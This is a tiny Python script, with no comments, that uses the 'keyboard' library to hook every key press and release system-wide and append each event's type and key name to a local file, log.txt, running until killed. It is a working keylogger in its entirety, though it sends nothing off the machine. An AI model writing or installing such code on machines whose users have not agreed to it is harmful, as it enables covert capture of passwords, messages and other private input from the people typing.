import keyboard
def p (e):
	with open('log.txt', 'a') as f:
		f.write(str(e.event_type) + str(e.name) + '\n')


keyboard.hook(p)
keyboard.wait()